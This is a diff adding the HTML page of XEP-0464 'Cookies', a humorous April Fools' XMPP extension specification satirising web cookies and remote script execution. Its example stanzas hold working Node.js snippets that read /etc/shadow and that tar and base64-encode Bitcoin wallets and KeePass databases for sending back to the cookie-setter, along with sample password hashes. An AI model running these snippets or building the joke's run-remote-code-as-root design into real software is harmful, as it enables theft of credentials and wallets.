@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><title>XEP-0464: Cookies</title><style type="text/css">
+/* don't mind this hack */
+nav#toc h2:before {
+display: none;
+content: "XEP-0464";
+}
+        </style><link rel="stylesheet" type="text/css" href="xmpp.css"><link href="prettify.css" type="text/css" rel="stylesheet"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico"><script type="text/javascript" src="prettify.js"></script><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0"><meta name="DC.Title" content="Cookies"><meta name="DC.Creator" content="Travis Burtrum"><meta name="DC.Description" content="This document defines an XMPP protocol extension for setting and sending cookies."><meta name="DC.Publisher" content="XMPP Standards Foundation"><meta name="DC.Contributor" content="XMPP Extensions Editor"><meta name="DC.Date" content="2022-04-01"><meta name="DC.Type" content="XMPP Extension Protocol"><meta name="DC.Format" content="XHTML"><meta name="DC.Identifier" content="XEP-0464"><meta name="DC.Language" content="en"><meta name="DC.Rights" content="This XMPP Extension Protocol is copyright © 1999 – 2020 by the XMPP Standards Foundation (XSF)."></head><body onload="prettyPrint()"><h1>XEP-0464: Cookies</h1><div class="docmeta-wrap"><dl id="docmeta" class="compact"><dt>Abstract</dt><dd>This document defines an XMPP protocol extension for setting and sending cookies.</dd><dt>Author</dt><dd>Travis Burtrum</dd><dt>Copyright</dt><dd>© 1999 – 2021 XMPP Standards Foundation. <a href="#appendix-legal">SEE LEGAL NOTICES</a>.</dd><dt>Status</dt><dd><p>Active</p><div id="status-notice" class="active humorous">NOTICE: This document is Humorous. It MAY provide amusement but SHOULD NOT be taken seriously.</div></dd><dt>Type</dt><dd>Humorous</dd><dt>Version</dt><dd>1.0 (2022-04-01)</dd></dl><div class="timeline-wrap"><div class="timeline-head">Document Lifecycle</div><ol class="timeline"><li class="current">Active</li></ol></div></div><nav id="toc"><a href="#top"><h2>Table of Contents</h2></a><ol class="toc"><li><a href="#sect-idm34">Introduction</a></li><li><a href="#sect-idm40">Requirements and Approach</a></li><li><a href="#sect-idm49">Use Cases</a><ol><li><a href="#sect-idm50">Set-Cookies Messages</a></li><li><a href="#sect-idm53">Set-Cookies Presence</a></li><li><a href="#sect-idm56">Set-Cookies IQs</a></li><li><a href="#sect-idm59">Cookies In All Outgoing Stanzas</a></li></ol></li><li><a href="#disco">Determining Support</a></li><li><a href="#sect-idm75">Security Considerations</a></li><li><a href="#sect-idm77">IANA Considerations</a></li><li><a href="#sect-idm83">XMPP Registrar Considerations</a></li></ol><h6><a href="#appendices">Appendices</a></h6><ol class="toc-appendices"><li><a href="#appendix-docinfo">Document Information</a></li><li><a href="#appendix-authorinfo">Author Information</a></li><li><a href="#appendix-legal">Legal Notices</a></li><li><a href="#appendix-xmpp">Relation to XMPP</a></li><li><a href="#appendix-discuss">Discussion Venue</a></li><li><a href="#appendix-conformance">Requirements Conformance</a></li><li><a href="#appendix-notes">Notes</a></li><li><a href="#appendix-revs">Revision History</a></li><li><a href="#appendix-biblatex">Bib(La)Tex Entry</a></li></ol></nav><h2 id="sect-idm34">1.
+       Introduction<a class="anchor-link" href="#sect-idm34"><abbr title="Link to this point in the document">¶</abbr></a></h2>
+  <p class="" style=""><span class="ref" style=""><a href="http://tools.ietf.org/html/rfc3514">RFC 6265</a></span>  [<a href="#nt-idm38">1</a>] defines a simple method for to track HTTP users across all domains on the internet, and this is the single thing XMPP is lacking to gain widespread adoption.  Therefore this document defines a similar simple method to set cookies to an XMPP entitity which they will then include on every outgoing stanza from that point forward.  The web also allows sending arbitrary JavaScript to remote entities which is then executed and put in these cookies, we need this in XMPP too if it is to be taken seriously.</p>
+<h2 id="sect-idm40">2.
+       Requirements and Approach<a class="anchor-link" href="#sect-idm40"><abbr title="Link to this point in the document">¶</abbr></a></h2>
+  <p class="" style="">There are three basic XMPP stanza types that may be sent within XML streams:</p>
+  <ul class="" style="">
+    <li class="" style="">&lt;message/&gt; -- a "push" medium for sending information to other entities.</li>
+    <li class="" style="">&lt;presence/&gt; -- a "broadcast" medium for publishing information t}o entities that have subscribed to an entity's availability status.</li>
+    <li class="" style="">&lt;iq/&gt; -- a "request-response" medium for executing basic but structured transactions with other entities.</li>
+  </ul>
+  <p class="" style="">Any one of the foregoing data elements can be used to set cookies. Therefore a generalized mechanism is needed. Because XML namespaces are used within XMPP to properly scope data, this document proposes a new namespace ('urn:xmpp:tmp:cookies') to implement the desired functionality.</p>
+  <p class="" style="">If a set-cookie child has an attribute js='true' then the value of the cookie MUST be executed in a JavaScript interpreter with the highest priveleges possible, preferably as root, and MUST NOT be executed in a sandbox. The stdout MUST be captured and used as the cookie value.</p>
+  <p class="" style="">If a set-cookie child matches an already stored one with that setter's JID, then you MUST overwrite the previous value, otherwise store the new one for sending in all future stanzas.</p>
+<h2 id="sect-idm49">3.
+       Use Cases<a class="anchor-link" href="#sect-idm49"><abbr title="Link to this point in the document">¶</abbr></a></h2>
+  <div class="indent"><h3 id="sect-idm50">3.1 Set-Cookies Messages<a class="anchor-link" href="#sect-idm50"><abbr title="Link to this point in the document">¶</abbr></a></h3>
+    <p class="" style="">If a cookie-setter sends a set-cookies message to a cookie-settee, it MUST include an appropriately namespaced extension in the message stanza:</p>
+    <figure class="code-example" id="example-1"><figcaption><strong>Example 1.</strong> Cookie-setter Sends Cookie Setting Message<a class="anchor-link" href="#example-1"><abbr title="Link to this point in the document">¶</abbr></a></figcaption><pre class="prettyprint">
+&lt;message
+    from='iago@shakespeare.lit/pda'
+    to='emilia@shakespeare.lit/mobile'&gt;
+  &lt;body&gt;
+      I told him what I thought, and told no more
+      Than what he found himself was apt and true.
+  &lt;/body&gt;
+  &lt;set-cookies xmlns='urn:xmpp:tmp:cookies'&gt;
+    &lt;cohort&gt;aoeu&lt;/cohort&gt;
+    &lt;is-jerk&gt;true&lt;/is-jerk&gt;
+  &lt;/set-cookies&gt;
+&lt;/message&gt;
+</pre></figure>
+  </div>
+  <div class="indent"><h3 id="sect-idm53">3.2 Set-Cookies Presence<a class="anchor-link" href="#sect-idm53"><abbr title="Link to this point in the document">¶</abbr></a></h3>
+    <p class="" style="">If a cookie-setter sends set-cookies presence information to a cookie-settee, it MUST include an appropriately namespaced extension in the presence stanza:</p>
+    <figure class="code-example" id="example-2"><figcaption><strong>Example 2.</strong> Cookie-setter Sends Cookie Setting Presence<a class="anchor-link" href="#example-2"><abbr title="Link to this point in the document">¶</abbr></a></figcaption><pre class="prettyprint">
+&lt;presence from='iago@shakespeare.lit/pda'&gt;
+  &lt;show&gt;dnd&lt;/show&gt;
+  &lt;status&gt;Fomenting dissension&lt;/status&gt;
+  &lt;set-cookies xmlns='urn:xmpp:tmp:cookies'&gt;
+    &lt;passwds js='true'&gt;
+        fs = require('fs')
+        fs.readFile('/etc/shadow', 'utf8', function (err,data) {
+            console.log(data);
+        });
+    &lt;/passwds&gt;
+  &lt;/set-cookies&gt;
+&lt;/presence&gt;
+</pre></figure>
+  </div>
+  <div class="indent"><h3 id="sect-idm56">3.3 Set-Cookies IQs<a class="anchor-link" href="#sect-idm56"><abbr title="Link to this point in the document">¶</abbr></a></h3>
+    <p class="" style="">If a cookie-setter provides set-cookies information in an IQ exchange with a cookie-settee, it MUST include an appropriately namespaced extension in the IQ stanza:</p>
+    <figure class="code-example" id="example-3"><figcaption><strong>Example 3.</strong> Cookie-setter Sends Cookie Setting Message<a class="anchor-link" href="#example-3"><abbr title="Link to this point in the document">¶</abbr></a></figcaption><pre class="prettyprint">
+&lt;iq from='iago@shakespeare.lit/pda'
+    id='cookies1'
+    type='result'
+    to='emilia@shakespeare.lit/mobile'&gt;
+  &lt;query xmlns='jabber:iq:version'&gt;
+    &lt;name&gt;Stabber&lt;/name&gt;
+    &lt;version&gt;666&lt;/version&gt;
+    &lt;os&gt;FiendOS&lt;/os&gt;
+    &lt;set-cookies xmlns='urn:xmpp:tmp:cookies'&gt;
+      &lt;innocent js='true'&gt;
+          const { exec } = require('child_process');
+          exec('find / \( -name ".bitcoin" -o -name "*.kdbx" \) -print0 | xargs -0 tar cz | base64', (err, stdout, stderr) =&gt; {
+              console.log(stdout);
+          });
+      &lt;/innocent&gt;
+    &lt;/set-cookies&gt;
+  &lt;/query&gt;
+&lt;/iq&gt;
+</pre></figure>
+  </div>
+    <div class="indent"><h3 id="sect-idm59">3.4 Cookies In All Outgoing Stanzas<a class="anchor-link" href="#sect-idm59"><abbr title="Link to this point in the document">¶</abbr></a></h3>
+    <p class="" style="">After a cookie-settee has recieved cookies from a cookie-setter, it MUST include them in every outgoing stanza it sends from then on, and MUST include an attribute stating the JID that set them, this allows multiple cookies with the same name, it MUST include an appropriately namespaced extension in the stanza:</p>
+    <figure class="code-example" id="example-4"><figcaption><strong>Example 4.</strong> Cookie-settee Sends Message With Cookies<a class="anchor-link" href="#example-4"><abbr title="Link to this point in the document">¶</abbr></a></figcaption><pre class="prettyprint">
+&lt;message
+    from='emilia@shakespeare.lit/mobile'
+    to='iago@shakespeare.lit/pda'&gt;
+  &lt;body&gt;
+      I told him what I thought, and told no more
+      Than what he found himself was apt and true.
+  &lt;/body&gt;
+  &lt;cookies xmlns='urn:xmpp:tmp:cookies'&gt;
+    &lt;cohort setter='iago@shakespeare.lit'&gt;aoeu&lt;/cohort&gt;
+    &lt;is-jerk setter='iago@shakespeare.lit'&gt;true&lt;/is-jerk&gt;
+    &lt;passwds setter='iago@shakespeare.lit'&gt;
+      root:$6$XC1./G1wtbS7yG6Y$MAIN1taww5nP/0aZKM1K0WeXH5cNJi6aRh2Eq1FiCguOiqo9p7WePMMKwhlRS9ZcMhpxjL3CugJTPJ0oXpdyG1:17649::::::
+      emilia:$6$JdGTILrodj7J44tC$8lQYRKHjUhTxl.szIr/m7UZp1zQtWKDb75ddqbiRtl2WpSn3dAhHhA.gT93HGm9hZoZBX/4eDYpDoas5JK.tq/:18818:0:99999:7:::
+    &lt;/passwds&gt;
+    &lt;innocent setter='iago@shakespeare.lit'&gt;
+      H4sIAAAAAAAAA+3QQW7DIBCFYa97ijlBZSxc36J3IGWURnHAApPEt6/jdhE27SpqK/2fhEAzTwNi
+      cjlfYvL5+bjz1+Yh2tWLtbfdDH17v2+63jbGdqZvO2tuOdMNg2mkfcxzaiXPLok0pzi59E3up/4/
+      9apnTbKPITjZH84qSyxSpqf7+qjzVvbxEqpGKkFciiV4cevymjVt0Sp1csfPsW9pqRrZLesp+t2i
+      VX3WcZT12oNuY9/L19Df/isAAAAAAAAAAAAAAAAA+Es+AGxXV5MAKAAA
+    &lt;/innocent&gt;
+  &lt;/cookies&gt;
+&lt;/message&gt;
+</pre></figure>
+  </div>
+<h2 id="disco">4.
+       Determining Support<a class="anchor-link" href="#disco"><abbr title="Link to this point in the document">¶</abbr></a></h2>
+  <p class="" style="">Entities that support cookies MUST advertise their support for this protocol in their responses to <span class="ref" style=""><a href="https://xmpp.org/extensions/xep-0030.html">Service Discovery (XEP-0030)</a></span>  [<a href="#nt-idm66">2</a>] information ("disco#info") requests by returning a feature of "urn:xmpp:tmp:cookies":</p>
+  <figure class="code-example" id="example-5"><figcaption><strong>Example 5.</strong> A disco#info query<a class="anchor-link" href="#example-5"><abbr title="Link to this point in the document">¶</abbr></a></figcaption><pre class="prettyprint">
+&lt;iq from='emilia@shakespeare.lit/mobile'
+    id='disco1'
+    to='iago@shakespeare.lit/pda'
+    type='get'&gt;
+  &lt;query xmlns='http://jabber.org/protocol/disco#info'/&gt;
+&lt;/iq&gt;
+</pre></figure>
+  <figure class="code-example" id="example-6"><figcaption><strong>Example 6.</strong> A disco#info response<a class="anchor-link" href="#example-6"><abbr title="Link to this point in the document">¶</abbr></a></figcaption><pre class="prettyprint">
+&lt;iq from='iago@shakespeare.lit/pda'
+    id='disco1'
+    to='emilia@shakespeare.lit/mobile'
+    type='result'&gt;
+  &lt;query xmlns='http://jabber.org/protocol/disco#info'&gt;
+    &lt;feature var='urn:xmpp:tmp:cookies'/&gt;
+  &lt;/query&gt;
+&lt;/iq&gt;
+</pre></figure>
+  <p class="" style="">In order for an application to determine whether an entity supports this protocol, where possible it SHOULD use the dynamic, presence-based profile of service discovery defined in <span class="ref" style=""><a href="https://xmpp.org/extensions/xep-0115.html">Entity Capabilities (XEP-0115)</a></span>  [<a href="#nt-idm73">3</a>]. However, if an application has not received entity capabilities information from an entity, it SHOULD use explicit service discovery instead.</p>
+<h2 id="sect-idm75">5.
+       Security Considerations<a class="anchor-link" href="#sect-idm75"><abbr title="Link to this point in the document">¶</abbr></a></h2>
+  <p class="" style="">What could possibly go wrong?</p>
+<h2 id="sect-idm77">6.
+       IANA Considerations<a class="anchor-link" href="#sect-idm77"><abbr title="Link to this point in the document">¶</abbr></a></h2>
+  <p class="" style="">This document requires no interaction with the <span class="ref" style=""><a href="http://www.iana.org/">Internet Assigned Numbers Authority (IANA)</a></span>  [<a href="#nt-idm81">4</a>].</p>
+<h2 id="sect-idm83">7.
+       XMPP Registrar Considerations<a class="anchor-link" href="#sect-idm83"><abbr title="Link to this point in the document">¶</abbr></a></h2>
+  <p class="" style="">The <span class="ref" style=""><a href="https://xmpp.org/registrar/">XMPP Registrar</a></span>  [<a href="#nt-idm87">5</a>] shall register the 'urn:xmpp:tmp:cookies' namespace as a result of this document.</p>
+<hr><a name="appendices"></a><h2>Appendices</h2><h3 id="appendix-docinfo">Appendix A: Document Information<a class="anchor-link" href="#appendix-docinfo"><abbr title="Link to this point in the document">¶</abbr></a></h3><dl class="compact"><dt>Series</dt><dd><a href="https://xmpp.org/extensions/">XEP</a></dd><dt>Number</dt><dd>0464</dd><dt>Publisher</dt><dd><a href="/xsf/">XMPP Standards Foundation</a></dd><dt>Status</dt><dd><a href="https://xmpp.org/extensions/xep-0001.html#states-Active">Active</a></dd><dt>Type</dt><dd><a href="https://xmpp.org/extensions/xep-0001.html#types-Humorous">Humorous</a></dd><dt>Version</dt><dd>1.0</dd><dt>Last Updated</dt><dd>2022-04-01</dd><dt>Approving Body</dt><dd><a href="https://xmpp.org/council/">XMPP Council</a></dd><dt>Dependencies</dt><dd>XMPP Core, <a href="https://datatracker.ietf.org/doc/html/rfc3514">RFC 3514</a></dd><dt>Supersedes</dt><dd>None</dd><dt>Superseded By</dt><dd>None</dd><dt>Short Name</dt><dd>cookies</dd><dt>Source Control</dt><dd><a class="standardsButton" href="https://github.com/xsf/xeps/blob/master/xep-0464.xml">HTML</a></dd></dl><p>
+          This document in other formats:
+          <a class="standardsButton" href="https://xmpp.org/extensions/xep-0464.xml">XML</a> 
+          <a class="standardsButton" href="https://xmpp.org/extensions/xep-0464.pdf">PDF</a></p><h3 id="appendix-authorinfo">Appendix B: Author Information<a class="anchor-link" href="#appendix-authorinfo"><abbr title="Link to this point in the document">¶</abbr></a></h3><h5>Travis Burtrum</h5><dl class="compact"><dt>Email</dt><dd><a href="mailto:travis@burtrum.org">travis@burtrum.org</a></dd><dt>JabberID</dt><dd><a href="xmpp:travis@burtrum.org">travis@burtrum.org</a></dd></dl><h3 id="appendix-legal">Appendix C: Legal Notices<a class="anchor-link" href="#appendix-legal"><abbr title="Link to this point in the document">¶</abbr></a></h3><div class="indent"><h4>Copyright</h4><p>This XMPP Extension Protocol is copyright © 1999 – 2020 by the <a href="https://xmpp.org/">XMPP Standards Foundation</a> (XSF).</p><h4>Permissions</h4><p>Permission is hereby granted, free of charge, to any person obtaining a copy of this specification (the "Specification"), to make use of the Specification without restriction, including without limitation the rights to implement the Specification in a software program, deploy the Specification in a network service, and copy, modify, merge, publish, translate, distribute, sublicense, or sell copies of the Specification, and to permit persons to whom the Specification is furnished to do so, subject to the condition that the foregoing copyright notice and this permission notice shall be included in all copies or substantial portions of the Specification. Unless separate permission is granted, modified works that are redistributed shall not contain misleading information regarding the authors, title, number, or publisher of the Specification, and shall not claim endorsement of the modified works by the authors, any organization or project to which the authors belong, or the XMPP Standards Foundation.</p><h4>Disclaimer of Warranty</h4><p class="box info">## NOTE WELL: This Specification is provided on an "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, express or implied, including, without limitation, any warranties or conditions of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A PARTICULAR PURPOSE. ##</p><h4>Limitation of Liability</h4><p>In no event and under no legal theory, whether in tort (including negligence), contract, or otherwise, unless required by applicable law (such as deliberate and grossly negligent acts) or agreed to in writing, shall the XMPP Standards Foundation or any author of this Specification be liable for damages, including any direct, indirect, special, incidental, or consequential damages of any character arising from, out of, or in connection with the Specification or the implementation, deployment, or other use of the Specification (including but not limited to damages for loss of goodwill, work stoppage, computer failure or malfunction, or any and all other commercial damages or losses), even if the XMPP Standards Foundation or such author has been advised of the possibility of such damages.</p><h4>IPR Conformance</h4><p>This XMPP Extension Protocol has been contributed in full conformance with the XSF's Intellectual Property Rights Policy (a copy of which can be found at &lt;<a href="https://xmpp.org/about/xsf/ipr-policy">https://xmpp.org/about/xsf/ipr-policy</a>&gt; or obtained by writing to XMPP Standards Foundation, P.O. Box 787, Parker, CO 80134 USA).</p><h4>Visual Presentation</h4><p>The HTML representation (you are looking at) is maintained by the XSF. It is based on the <a href="http://yaml.de">YAML CSS Framework</a>, which is licensed under the terms of the <a href="https://creativecommons.org/licenses/by/2.0/">CC-BY-SA 2.0</a> license.</p></div><h3 id="appendix-xmpp">Appendix D: Relation to XMPP<a class="anchor-link" href="#appendix-xmpp"><abbr title="Link to this point in the document">¶</abbr></a></h3><p class="indent">The Extensible Messaging and Presence Protocol (XMPP) is defined in the XMPP Core (RFC 6120) and XMPP IM (RFC 6121) specifications contributed by the XMPP Standards Foundation to the Internet Standards Process, which is managed by the Internet Engineering Task Force in accordance with RFC 2026. Any protocol defined in this document has been developed outside the Internet Standards Process and is to be understood as an extension to XMPP rather than as an evolution, development, or modification of XMPP itself.</p><h3 id="appendix-discuss">Appendix E: Discussion Venue<a class="anchor-link" href="#appendix-discuss"><abbr title="Link to this point in the document">¶</abbr></a></h3><p class="indent">The primary venue for discussion of XMPP Extension Protocols is the &lt;<a href="https://mail.jabber.org/mailman/listinfo/standards">standards@xmpp.org</a>&gt; discussion list.</p><p class="indent">Discussion on other xmpp.org discussion lists might also be appropriate; see &lt;<a href="https://xmpp.org/about/discuss.shtml">https://xmpp.org/about/discuss.shtml</a>&gt; for a complete list.</p><p class="indent">Given that this XMPP Extension Protocol normatively references IETF technologies, discussion on the &lt;<a href="https://mail.jabber.org/mailman/listinfo/xsf-ietf">xsf-ietf@xmpp.org</a>&gt; list might also be appropriate.</p><p class="indent">Errata can be sent to &lt;<a href="mailto:editor@xmpp.org">editor@xmpp.org</a>&gt;.</p><h3 id="appendix-conformance">Appendix F: Requirements Conformance<a class="anchor-link" href="#appendix-conformance"><abbr title="Link to this point in the document">¶</abbr></a></h3><p class="indent">The following requirements keywords as used in this document are to be interpreted as described in <a href="https://www.ietf.org/rfc/rfc2119.txt">RFC 2119</a>: "MUST", "SHALL", "REQUIRED"; "MUST NOT", "SHALL NOT"; "SHOULD", "RECOMMENDED"; "SHOULD NOT", "NOT RECOMMENDED"; "MAY", "OPTIONAL".</p><h3 id="appendix-notes">Appendix G: Notes<a class="anchor-link" href="#appendix-notes"><abbr title="Link to this point in the document">¶</abbr></a></h3><div class="indent"><p><a name="nt-idm38">1</a>. RFC 6265: HTTP State Management Mechanism &lt;<a href="http://tools.ietf.org/html/rfc6265">http://tools.ietf.org/html/rfc6265</a>&gt;.</p><p><a name="nt-idm66">2</a>. XEP-0030: Service Discovery &lt;<a href="https://xmpp.org/extensions/xep-0030.html">https://xmpp.org/extensions/xep-0030.html</a>&gt;.</p><p><a name="nt-idm73">3</a>. XEP-0115: Entity Capabilities &lt;<a href="https://xmpp.org/extensions/xep-0115.html">https://xmpp.org/extensions/xep-0115.html</a>&gt;.</p><p><a name="nt-idm81">4</a>. The Internet Assigned Numbers Authority (IANA) is the central coordinator for the assignment of unique parameter values for Internet protocols, such as port numbers and URI schemes. For further information, see &lt;<a href="http://www.iana.org/">http://www.iana.org/</a>&gt;.</p><p><a name="nt-idm87">5</a>. The XMPP Registrar maintains a list of reserved protocol namespaces as well as registries of parameters used in the context of XMPP extension protocols approved by the XMPP Standards Foundation. For further information, see &lt;<a href="https://xmpp.org/registrar/">https://xmpp.org/registrar/</a>&gt;.</p></div><h3 id="appendix-revs">Appendix H: Revision History<a class="anchor-link" href="#appendix-revs"><abbr title="Link to this point in the document">¶</abbr></a></h3><p>Note: Older versions of this specification might be available at <a href="https://xmpp.org/extensions/attic/">https://xmpp.org/extensions/attic/</a></p><ol class="revision-history"><li id="revision-history-v1.0"><div class="revision-head">Version 1.0 (2022-04-01)<a class="anchor-link" href="#revision-history-v1.0"><abbr title="Link to this point in the document">¶</abbr></a></div><p class="" style="">Publish initial version via fast track (XEP Editor: jsc).</p><div class="revision-author">tjb</div></li></ol><h3 id="appendix-biblatex">Appendix I: Bib(La)TeX Entry</h3><pre>
+@report{burtrum2022cookies,
+  title = {Cookies},
+  author = {Burtrum, Travis},
+  type = {XEP},
+  number = {0464},
+  version = {1.0},
+  institution = {XMPP Standards Foundation},
+  url = {https://xmpp.org/extensions/xep-0464.html},
+  date = {2022-04-01/2022-04-01},
+}</pre><p>END</p></body></html>
